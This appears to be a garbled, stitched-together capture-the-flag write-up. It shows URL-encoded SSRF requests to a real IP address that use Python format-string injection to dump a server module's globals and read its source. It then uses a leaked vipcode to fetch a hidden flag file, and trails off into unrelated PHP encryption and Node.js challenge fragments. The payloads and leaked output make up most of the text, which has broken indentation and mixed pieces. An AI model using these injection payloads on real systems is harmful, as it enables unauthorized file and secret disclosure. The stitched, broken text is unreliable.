D%26vipcode%3D0&begin=%25s%25
The content of  is error%d
http://121.37.179.47:1101/?
head=%5C&url=http%3A%2F%2F127.0.0.1%3A8080%2Fread%2Ffile%3D%7Bfile.__class__._
_init__.__globals__%7D%26vipcode%3D0&begin=%25s%25
The content of {'__loader__': , '__name__': 'base.readfile', 'vip': , '__cached__': '/app/base/__pycache__/readfile.cpython-
35.pyc', 'vipreadfile': , 're': , 'File': , 
'readfile': , '__builtins__': {'divmod': 
, 'int': , 'UserWarning': , 'vars': , 'iter': , 'hasattr': , 'ascii': , 'zip': , 'BrokenPipeError': , 
'range': , 'StopIteration': , 'bytes': 
, 'UnicodeWarning': , '__package__': 
'', 'delattr': , 'PendingDeprecationWarning': 
, 'str': , 'help': Type help() 
for interactive help, or help(object) for help about object., 
'AttributeError': , 'EOFError': , 
'len': , 'KeyboardInterrupt': , 'frozenset': , 'copyright': Copyright 
(c) 2001-2016 Python Software Foundation.
All Rights Reserved.
Copyright (c) 2000 BeOpen.com.
All Rights Reserved.
Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.
Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., 'super': , 'hex': , 'reversed': , 'NotADirectoryError': , 'UnicodeTranslateError': , 'map': , 'IOError': , 
'globals': , 'enumerate': , 
'ReferenceError': , 'ImportError': , 'compile': , 'abs': , 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'SystemError': 
, 'NotImplementedError': , 
'BaseException': , 'dir': , 
'ChildProcessError': , 'input': , 'RuntimeError': , 'hash': , 'NameError': , 'None': None, 'id': , 'SystemExit': , 'property': , 'OverflowError': , 'IndentationError': 
, '__name__': 'builtins', 'open': , 'min': , 'FloatingPointError': , 'OSError': , 'exit': Use exit() or 
Ctrl-D (i.e. EOF) to exit, 'ord': , 'credits':     
Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more 
information., 'dict': , 'ConnectionResetError': , 'ProcessLookupError': , 
'FutureWarning': , 'IsADirectoryError': , 'TabError': , 'EnvironmentError': 
, 'UnboundLocalError': , 
'ArithmeticError': , 'oct': , 
'float': , 'ConnectionRefusedError': , 'next': , 'tuple': , 'bin': , 'True': True, 'callable': , 'memoryview': , 'pow': , 'FileExistsError': , 
'StopAsyncIteration': , 'repr': , 'complex': , 'UnicodeDecodeError': , 'print': , 'staticmethod': 
, 'getattr': , 
'RecursionError': , '__doc__': "Built-in functions, 
exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; 
Ellipsis represents `...' in slices.", 'FileNotFoundError': , 'exec': , 'ValueError': , 'InterruptedError': , 'isinstance': 
, 'classmethod': , 
'license': Type license() to see the full license text, 'sorted': , '__build_class__': , 
'any': , 'list': , 'NotImplemented': 
NotImplemented, 'ZeroDivisionError': , 'max': 
, 'all': , 'UnicodeEncodeError': 
, 'IndexError': , 'chr': 
, 'ConnectionAbortedError': , 'BlockingIOError': , 
'UnicodeError': , 'ResourceWarning': , 'BytesWarning': , 'SyntaxError': 
, 'type': , 'Exception': , '__import__': , 
'DeprecationWarning': , 'ImportWarning': , 'Ellipsis': Ellipsis, 'RuntimeWarning': , 'GeneratorExit': , 
'PermissionError': , 'Warning': , 
'ConnectionError': , 'AssertionError': , 'filter': , 'locals': , 'eval': , 'BufferError': , 'SyntaxWarning': , '__debug__': True, 
'bool': , 'LookupError': , '__spec__': 
ModuleSpec(name='builtins', loader=), '__loader__': , 'sum': , 'False': 
False, 'object': , 'KeyError': , 
'bytearray': , 'set': , 'MemoryError': , 'setattr': , 'format': , 'TimeoutError': , 'TypeError': , 'round': , 'slice': , 
'issubclass': }, 'os': , '__package__': 'base', '__doc__': None, 
'current_folder_file': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 
'10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', 
'23', '24'], '__spec__': ModuleSpec(name='base.readfile', loader=
, 
origin='/app/base/readfile.py'), '__file__': '/app/base/readfile.py'} is 
error%d
Welcome,dear vip! Here are what you want:
The file you read is:
/app/base/readfile.py
The content is:
from .vip import vip
import re
import os
class File:
    def __init__(self,file):
        self.file = file
    def __str__(self):
        return self.file
    def GetName(self):
        return self.file
class readfile():
    def __str__(self):
        filename = self.GetFileName()
        if '..' in filename or 'proc' in filename:
            return "quanbumuda"
        else:
            try:
                file = open("/tmp/" + filename, 'r')
                content = file.read()
                file.close()
                return content
            except:
                return "error"
    def __init__(self, data):
        if re.match(r'file=.*?&vipcode=.*?',data) != None:
            data = data.split('&')
            data = {
                data[0].split('=')[0]: data[0].split('=')[1],
                data[1].split('=')[0]: data[1].split('=')[1]
            }
            if 'file' in data.keys():
                self.file = File(data['file'])
            if 'vipcode' in data.keys():
                self.vipcode = data['vipcode']
            self.vip = vip()
        def test(self):
        if 'file' not in dir(self) or 'vipcode' not in dir(self) or 'vip' not 
in dir(self):
            return False
        else:
            return True
     def isvip(self):
        if self.vipcode == self.vip.GetCode():
            return True
        else:
            return False
     def GetFileName(self):
        return self.file.GetName()
        current_folder_file = []
ﬂ4g
ﬁle, f, ﬂ4gf, 
dooog
cmd
class vipreadfile():
    def __init__(self,readfile):
        self.filename = readfile.GetFileName()
        self.path = os.path.dirname(os.path.abspath(self.filename))
        self.file = File(os.path.basename(os.path.abspath(self.filename)))
        global current_folder_file
        try:
            current_folder_file = os.listdir(self.path)
        except:
            current_folder_file = current_folder_file
    def __str__(self):
        if 'fl4g' in self.path:
            return 'nonono,this folder is a secret!!!'
        else:
            output = '''Welcome,dear vip! Here are what you want:\r\nThe file 
you read is:\r\n'''
            filepath = (self.path + '/{vipfile}').format(vipfile=self.file)
            output += filepath
            output += '\r\n\r\nThe content is:\r\n'
            try:
                f = open(filepath,'r')
                content = f.read()
                f.close()
            except:
                content = 'can\'t read'
            output += content
            output += '\r\n\r\nOther files under the same folder:\r\n'
            output += ' '.join(current_folder_file)
            return output
Other files under the same folder:
__pycache__ __init__.py vip.py readfile.py%d          
http%3A%2F%2F127.0.0.1%3A8080%2Fread%2Ffile%3D{vipfile.file[0]}l4g_1s_h3re_u_w
i11_rua%2fflag%26vipcode%3Dm3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf
if int(time.time()) - data['timestamp'] -->
");
  $iv = "";
  for ($i = 0; $i ");
  $hash = md5($target);
  print_r($hash."");
  $c = openssl_encrypt($target, 'des-cbc', $key, 0, $iv);
  // print_r($c."");
  print_r(base64_encode($c)."");
clone quiz.php?
answer=user->uploader->black_list  getshell
GuessGame
var config = {
    "forbidAdmin" : true,
    //"enableReg" : true
};
var loginHistory = [];
var adminName = "admin888";
var flag = "************";
app.get('/', function (req, res) {
    res.render("index");
});
//So terrible code~